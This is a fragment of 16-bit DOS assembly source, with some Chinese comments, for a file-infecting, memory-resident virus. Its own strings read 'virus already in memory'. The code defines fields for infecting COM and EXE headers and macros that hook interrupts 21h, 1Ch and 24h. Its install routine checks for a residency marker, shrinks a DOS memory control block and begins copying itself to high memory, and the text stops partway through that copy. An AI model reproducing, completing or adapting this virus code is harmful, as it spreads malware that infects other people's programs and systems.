;       OK  !!!
.model  tiny
.code

        org 100h
;**********************主程序入口*******************************
start:          jmp     begin

;************************macro defines********************
fileptr_reset   proc    near
                mov     bx,handle
                mov     ax,4200h
                xor     cx,cx
                xor     dx,dx
                int     21h
                ret
fileptr_reset   endp

doscall macro funcnum
        mov ah,funcnum
        int 21h
        endm

gsv     macro intnum ,oldint ,newint
        mov ah,35h
        mov al,intnum
        int 21h
	mov word ptr oldint ,bx
	mov word ptr oldint+2,es
	mov dx,offset newint
	mov ah,25h
        mov al,intnum
        int 21h
        endm
pushr   macro
        push ax
        push bx
        push cx
        push dx
        push si
        push di
        push es
        push ds
        push bp
        endm
popr    macro
        pop bp
        pop ds
        pop es
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        endm

;***********************data area****************************
file_mod_len    equ     2
file_page_len   equ     4
file_header_len equ     8
rel_ss          equ     0eh
rel_sp          equ     10h
minus_sum       equ     12h
load_ip         equ     14h
rel_cs          equ     16h
EXEFILE         EQU     1
COMFILE         EQU     0

ecflag          db      COMFILE
fattrib         dw      ?
ftime           dw      ?
fdate           dw      ?
execpoint       dd      ?
handle          dw      ?
psp             dw      ?
;fcb             =this   byte
dir_buff        db      30 dup("a")
file_name       db      13 dup("a")
                db      "a"
old21           dd      "a"
old1c           dd      "a"
old24           dd      "a"
inmem           db      "virus already in memory ! any key to return user programe !$"
resident        db      "any key to resident !$"
;from exe file header
oldip           dw ?
oldcs           dw ?
oldmod          dw ?
oldpage         dw ?
newip           dw 100h
newcs           dw ?
sizeoffset      dw exeladdr
exeladdr        equ $-100h
exelength       dd ?
;comlength       dw 0    ;only to com file
comhead         db 0cdh
                dw 20h
newcomh		db 0e9h
buffer2		dw ?
filelength      dw file_length

begin:
        db      0bbh
comlength       dw   0h ;mov  bx,0h ;update offset exe =0 com=old_com_length
        push    ds
        pop     cs:psp[bx]
        push    bx
        mov     ax,0ffffh
        mov     bx,0ffffh
        int     21h
        pop     bx
        cmp     ax,1234h
        jne     next0
        mov     dx,offset inmem
        add     dx,bx
        call    list
        jmp      touse
next0:
        mov     dx,offset resident
        add     dx,bx
        call    list
        push bx
        mov     ax,cs:psp[bx]
	dec ax
search: mov es,ax
        cmp byte ptr es:[0],5ah ;'z'
        jz  next
        inc ax
        add ax,word ptr es:[3]
        jmp short search
next:   mov ax,filelength[bx]
        add ax,bx                ;filelength to paragraphs     ???
	mov cl,4
	shr ax,cl
	inc ax
        sub word ptr es:[3],ax
	jc  touse
	mov ax,es
	inc ax
	add ax,word ptr es:[3]
	mov es,ax
;move code to high memory
        push cs
        pop ds
        mov si,100h
        pop bx
        add si,bx     ;???
        mov di,0
	cld            
